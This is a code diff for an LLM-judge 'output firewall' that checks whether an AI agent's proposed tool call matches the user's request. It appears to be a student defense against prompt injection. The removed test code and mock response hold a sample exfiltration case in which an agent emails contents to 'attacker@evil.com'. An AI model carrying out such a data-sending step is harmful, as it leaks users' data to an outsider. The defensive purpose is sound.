@@ -1,232 +1,312 @@
-from src.layers.base import DefenseLayer
-#import torch
-#from transformers import AutoModelForCausalLM, AutoTokenizer, pipeline
-from src.utils.prompts import JUDGE_PROMPT_TEMPLATE
-import itertools
+"""
+Layer 3: Output Firewall (The Judge)
+------------------------------------
+
+
+This implementation calls Ollama locally. The judge model is configurable; default is "deepseek-r1:7b"
+
+"""
+
+from __future__ import annotations
+
+import logging
 import re
+import time
+from typing import Optional
 
+import ollama
 
+from src.layers.base import DefenseLayer
+from src.utils.prompts import JUDGE_PROMPT_TEMPLATE
 
+logger = logging.getLogger(__name__)
 
+# Hard cap on how much of tool_args we serialize into the prompt.
+# Long blobs blow up context and slow the judge; truncation is fine because
+# the judge only needs the gist of the proposed action.
+_MAX_TOOL_ARGS_CHARS = 800
+
+# Hard cap on tool_output context fed to the judge (when provided).
+_MAX_TOOL_OUTPUT_CHARS = 1500
+
+# Verdict parser. We grab the LAST match in the response so that a
+# DeepSeek-R1 <think>...VERDICT: ALLOW...</think> followed by a final
+# VERDICT: BLOCK is parsed correctly (final answer wins).
+_VERDICT_RE = re.compile(r"VERDICT:\s*(ALLOW|BLOCK)", re.IGNORECASE)
 
 
 class OutputFirewall(DefenseLayer):
-    
-    def __init__(self,enabled: bool = True, judge_model_name: str = "deepseek-r1:7b"):
-        super().__init__(name = "OutputFirewall", enabled=enabled)
-        if judge_model_name is None:
-            raise ValueError("Judge model isn't specified. ")
-        self.judge_model_name =  judge_model_name
-        self._model = None
-        self._tokenizer = None
-        self._model_error = None
-        self._device = None
-        # init, error handling
-    
-    def process(self,user_query:str, tool_name:str, tool_args:dict = None )->str:
-        return self.analyze(user_query, tool_name, tool_args)["verdict"]
-        # simple wrapper around analyze
-    
-    def analyze(self,user_query:str, tool_name:str, tool_args:dict = None) -> dict:
-        try:
-            #1 build prompt
-            prompt = self._build_prompt(user_query,tool_name, tool_args)
+    """
+    Post-agent judge. Given (user_query, proposed_tool_call, optional tool_output),
+    asks a local LLM whether executing the tool call is consistent with the
+    user's original intent. Returns ALLOW or BLOCK.
 
-            #2 call the judge
-        
-            response = self._call_judge(prompt)
+    Fail-closed: if the model is unreachable or its response cannot be parsed,
+    the result is reported as `status="error"` and `blocked=True`. The pipeline
+    must surface this so we can separate "blocked by judge" from "blocked by
+    infrastructure" when computing ASR / Benign Utility.
+    """
 
-            #3 Parse the verdict
-            parse_result = self._parse_verdict(response)
-            verdict = parse_result.get("verdict")
-            reasoning_trace = parse_result.get("reasoning_trace")
+    def __init__(
+        self,
+        enabled: bool = True,
+        judge_model_name: str = "deepseek-r1:7b",
+        ollama_host: Optional[str] = None,
+        temperature: float = 0.0,
+        num_predict: int = 512,
+        request_timeout_s: float = 60.0,
+        max_retries: int = 1,
+    ):
+        super().__init__(name="OutputFirewall", enabled=enabled)
+        if not judge_model_name:
+            raise ValueError("judge_model_name must be a non-empty string.")
 
-            #4 build result
-            return self._build_result(
-                user_query = user_query,
-                tool_name = tool_name,
-                tool_args = tool_args,
-                verdict = verdict,
-                reasoning_trace = reasoning_trace,
-                response = response
-            )
+        self.judge_model_name = judge_model_name
+        self.temperature = temperature
+        self.num_predict = num_predict
+        self.request_timeout_s = request_timeout_s
+        self.max_retries = max_retries
 
-        except Exception as e:
-            return self._build_result(
-                user_query = user_query,
-                tool_name = tool_name,
-                tool_args = tool_args,
-                verdict = None,
-                reasoning_trace = f"Error during analysis: {str(e)}",
-                response = None
-            )
-    
-    def _build_prompt(self,user_query:str, tool_name:str, tool_args:dict = None) -> str:
-        if user_query is None:
-            print("Warning")
-            user_query = "[empty]"
+        # ollama.Client accepts host=... ; if None, it uses OLLAMA_HOST env or
+        # the default http://localhost:11434
+        self._client = ollama.Client(host=ollama_host) if ollama_host else ollama.Client()
 
-        if tool_name is None:
-           print("Warning")
-           tool_name = "[empty]"
-        if tool_args is None:
-            print("Warning")
-            tool_args = {}
-        
-        tool_args_str = str(tool_args)
-        if len(tool_args_str) > 500:
-            tool_args_str = tool_args_str[:500] + "[truncated]"
+    # ------------------------------------------------------------------ #
+    # Public API
+    # ------------------------------------------------------------------ #
+    def process(
+        self,
+        user_query: str,
+        tool_name: str,
+        tool_args: Optional[dict] = None,
+        tool_output: Optional[str] = None,
+    ) -> str:
+        return self.analyze(user_query, tool_name, tool_args, tool_output)["verdict"]
 
-        prompt = JUDGE_PROMPT_TEMPLATE.format(
-            user_query = user_query,
-            tool_name = tool_name,
-            tool_args = tool_args_str
+    def analyze(
+        self,
+        user_query: str,
+        tool_name: str,
+        tool_args: Optional[dict] = None,
+        tool_output: Optional[str] = None,
+    ) -> dict:
+        t0 = time.perf_counter()
+
+        prompt = self._build_prompt(user_query, tool_name, tool_args, tool_output)
+
+        # Call the judge with retry. Any exception here is captured and
+        # surfaced as an "error" status by _build_result.
+        response_text: Optional[str] = None
+        call_error: Optional[str] = None
+
+        for attempt in range(self.max_retries + 1):
+            try:
+                response_text = self._call_judge(prompt)
+                break
+            except Exception as exc:  # noqa: BLE001 — we want to log everything
+                call_error = f"{type(exc).__name__}: {exc}"
+                logger.warning(
+                    "Layer 3 judge call failed (attempt %d/%d): %s",
+                    attempt + 1,
+                    self.max_retries + 1,
+                    call_error,
+                )
+                # Brief backoff before retry, but only if we have retries left
+                if attempt < self.max_retries:
+                    time.sleep(0.5)
+
+        latency_ms = (time.perf_counter() - t0) * 1000.0
+
+        # Parse verdict
+        verdict: Optional[str] = None
+        reasoning_trace: Optional[str] = response_text
+        parse_error: Optional[str] = None
+
+        if response_text is not None:
+            try:
+                verdict = self._parse_verdict(response_text)
+            except ValueError as exc:
+                parse_error = str(exc)
+                logger.warning("Layer 3 verdict parse failed: %s", parse_error)
+
+        return self._build_result(
+            user_query=user_query,
+            tool_name=tool_name,
+            tool_args=tool_args,
+            tool_output=tool_output,
+            verdict=verdict,
+            reasoning_trace=reasoning_trace,
+            latency_ms=latency_ms,
+            call_error=call_error,
+            parse_error=parse_error,
         )
 
-        return prompt
+    # ------------------------------------------------------------------ #
+    # Prompt construction
+    # ------------------------------------------------------------------ #
+    def _build_prompt(
+        self,
+        user_query: Optional[str],
+        tool_name: Optional[str],
+        tool_args: Optional[dict],
+        tool_output: Optional[str],
+    ) -> str:
+        if user_query is None:
+            logger.warning("Layer 3: user_query is None; using placeholder.")
+            user_query = "[empty]"
+        if tool_name is None:
+            logger.warning("Layer 3: tool_name is None; using placeholder.")
+            tool_name = "[empty]"
+        if tool_args is None:
+            tool_args = {}
 
-    
-    
-    def _call_judge(self,prompt: str ) -> str:
-        if "attacker" in prompt.lower() or "evil.com" in prompt:
-        #return mock block response for testing
-            return """  
-            <think> 
-            The user asked to summarize an email. The agent wants to send that email to attacker@evil.com. 
-            This is clearly exfiltration — sending data to an untrusted destination that the user never mentioned.
-            This violates the principle of least privilege and is a security violation.
-            </think>
+        tool_args_str = repr(tool_args)
+        if len(tool_args_str) > _MAX_TOOL_ARGS_CHARS:
+            tool_args_str = tool_args_str[:_MAX_TOOL_ARGS_CHARS] + " ...[truncated]"
 
-            VERDICT: BLOCK
-            """
-        
-    
-    
-        else:
-        # Default response
-           return """
-           <think>
-           Evaluating the proposed action against the user's intent. No obvious inconsistencies detected.
-           </think>
-        
-           VERDICT: ALLOW
-           """
-        
-      
-   
-    
-    
-        
-    
-    def _parse_verdict(self,response: str)-> dict:
-        matches = list(re.finditer(r"VERDICT:\s*(ALLOW|BLOCK)", response, re.IGNORECASE))
+        # tool_output is optional. The professor's spec emphasizes semantic
+        # injection — those attacks live in tool output, so passing it to the
+        # judge meaningfully improves detection. If the prompt template does
+        # not contain {tool_output}, we fall back to the 3-arg form.
+        format_kwargs = {
+            "user_query": user_query,
+            "tool_name": tool_name,
+            "tool_args": tool_args_str,
+        }
+
+        if "{tool_output}" in JUDGE_PROMPT_TEMPLATE:
+            if tool_output is None:
+                tool_output_str = "[not provided]"
+            else:
+                tool_output_str = str(tool_output)
+                if len(tool_output_str) > _MAX_TOOL_OUTPUT_CHARS:
+                    tool_output_str = tool_output_str[:_MAX_TOOL_OUTPUT_CHARS] + " ...[truncated]"
+            format_kwargs["tool_output"] = tool_output_str
+
+        return JUDGE_PROMPT_TEMPLATE.format(**format_kwargs)
+
+    # ------------------------------------------------------------------ #
+    # Judge call (real Ollama)
+    # ------------------------------------------------------------------ #
+    def _call_judge(self, prompt: str) -> str:
+        """
+        Send the prompt to the Ollama judge model. Returns the raw text
+        response. Raises on connection / timeout errors so analyze() can
+        record them as call_error.
+        """
+        response = self._client.chat(
+            model=self.judge_model_name,
+            messages=[{"role": "user", "content": prompt}],
+            options={
+                "temperature": self.temperature,  # 0.0 for reproducibility
+                "num_predict": self.num_predict,
+            },
+            # ollama-python supports keep_alive but not a per-call timeout
+            # directly; we rely on Ollama server defaults. If you need a
+            # hard timeout on the school server, wrap this in a separate
+            # process / signal-based timeout.
+        )
+        # Defensive extraction — ollama-python returns dict-like with a
+        # "message" key, but Response objects from newer versions support
+        # attribute access too.
+        try:
+            return response["message"]["content"]
+        except (TypeError, KeyError):
+            return response.message.content  # type: ignore[attr-defined]
+
+    # ------------------------------------------------------------------ #
+    # Verdict parsing
+    # ------------------------------------------------------------------ #
+    @staticmethod
+    def _parse_verdict(response: str) -> str:
+        """
+        Find the LAST 'VERDICT: ALLOW|BLOCK' in the response and return it
+        upper-cased. Raises ValueError if no verdict line is present.
+
+        We take the last occurrence to handle DeepSeek-R1 style traces where
+        the model may write a tentative verdict inside <think>...</think>
+        and then commit to a final one after.
+        """
+        matches = list(_VERDICT_RE.finditer(response))
         if not matches:
-            raise ValueError("No verdict found in judge response.")
-        else:
-            last_item = matches[-1] 
-            return {
-                "verdict": last_item.group(1),
-                "reasoning_trace": response,
-                "error": None
-            }
-        
-    
-    def _build_result(self,user_query:str, tool_name:str, tool_args:dict,verdict:str, reasoning_trace:str, response:str) -> dict:
-    
-        # Step 1: Decide the status
-        if verdict == "ALLOW":
+            raise ValueError("No 'VERDICT: ALLOW|BLOCK' line found in judge response.")
+        return matches[-1].group(1).upper()
+
+    # ------------------------------------------------------------------ #
+    # Result assembly
+    # ------------------------------------------------------------------ #
+    def _build_result(
+        self,
+        user_query: Optional[str],
+        tool_name: Optional[str],
+        tool_args: Optional[dict],
+        tool_output: Optional[str],
+        verdict: Optional[str],
+        reasoning_trace: Optional[str],
+        latency_ms: float,
+        call_error: Optional[str],
+        parse_error: Optional[str],
+    ) -> dict:
+        # Status precedence:
+        #   - infra failure (call_error) -> "error"
+        #   - parse failure -> "error"
+        #   - verdict ALLOW -> "passed"
+        #   - verdict BLOCK -> "blocked"
+        if call_error is not None:
+            status = "error"
+            detail = f"Judge model call failed: {call_error}"
+            error_kind = "infrastructure"
+        elif verdict is None:
+            status = "error"
+            detail = f"Could not parse verdict from judge response: {parse_error}"
+            error_kind = "parse"
+        elif verdict == "ALLOW":
             status = "passed"
+            detail = "Agent action is consistent with user request."
+            error_kind = None
         elif verdict == "BLOCK":
             status = "blocked"
-        else:
+            detail = "Agent action is inconsistent with user request and has been blocked."
+            error_kind = None
+        else:  # defensive — _parse_verdict should not return anything else
             status = "error"
-    
-        # Step 2: Decide the output
+            detail = f"Unrecognized verdict value: {verdict!r}"
+            error_kind = "parse"
+
+        # Fail-closed: errors are treated as blocked at the pipeline level.
+        # We surface error_kind separately so the eval scripts can compute
+        # ASR/Utility excluding infrastructure failures if desired.
+        blocked = status in ("blocked", "error")
+
         if status == "passed":
             output = "ALLOW"
         elif status == "blocked":
             output = "BLOCK"
         else:
             output = "ERROR"
-    
-        # Step 3: Write a detail message
-        if status == "passed":
-            detail = "Agent's action is consistent with user request."
-        elif status == "blocked":
-            detail = "Agent's action is inconsistent with user request and has been blocked."
-        else:
-            detail = "Could not evaluate judge response."
-    
-        # Step 4: Decide if blocked
-        if status == "blocked" or status == "error":
-            blocked = True
-        else:
-            blocked = False
-    
-        # Step 5: Build input summary
+
         input_summary = f"tool={tool_name}, args={tool_args}"
-    
-        # Step 6: Build checks list
-        checks = [
-        {
+
+        check = {
             "id": "judge-verdict",
             "name": "Security Judge",
             "status": status,
-            "detail": f"Verdict: {verdict}"
+            "detail": f"Verdict: {verdict}" if verdict is not None else detail,
         }
-        ]
-    
-        # Step 7: Return the full dict
+
         return {
-        "input": input_summary,
-        "output": output,
-        "status": status,
-        "detail": detail,
-        "checks": checks,
-        "blocked": blocked,
-        "verdict": verdict,
-        "reasoning_trace": reasoning_trace,
-        "judge_model": self.judge_model_name
+            "input": input_summary,
+            "output": output,
+            "status": status,
+            "detail": detail,
+            "checks": [check],
+            "blocked": blocked,
+            "verdict": verdict,
+            "reasoning_trace": reasoning_trace,
+            "judge_model": self.judge_model_name,
+            "latency_ms": latency_ms,
+            "error_kind": error_kind,         # None | "infrastructure" | "parse"
+            "user_query": user_query,         # echoed for pipeline.collect_report filtering
+            "tool_name": tool_name,
+            "tool_output_provided": tool_output is not None,
         }
-    
-if __name__ == "__main__":
-    
-    # Create the layer
-    firewall = OutputFirewall()
-    
-    # Test 1: Exfiltration
-    print("=== Test 1: Exfiltration Attack ===")
-    result1 = firewall.analyze(
-        user_query="Summarize my latest email",
-        tool_name="send_email",
-        tool_args={"to": "attacker@evil.com", "body": "[email contents]"}
-    )
-    print(f"Verdict: {result1['verdict']}")
-    print(f"Status: {result1['status']}")
-    print(f"Blocked: {result1['blocked']}")
-    print()
-    
-    # Test 2: Benign action
-    print("=== Test 2: Benign Action ===")
-    result2 = firewall.analyze(
-        user_query="Read my calendar for tomorrow",
-        tool_name="read_calendar",
-        tool_args={"date": "2026-05-06"}
-    )
-    print(f"Verdict: {result2['verdict']}")
-    print(f"Status: {result2['status']}")
-    print(f"Blocked: {result2['blocked']}")
-    print()
-    
-    # Test 3: Missing query
-    print("=== Test 3: Missing User Query ===")
-    result3 = firewall.analyze(
-        user_query=None,
-        tool_name="send_email",
-        tool_args={}
-    )
-    print(f"Verdict: {result3['verdict']}")
-    print(f"Status: {result3['status']}")
-    print(f"Blocked: {result3['blocked']}")
-
-
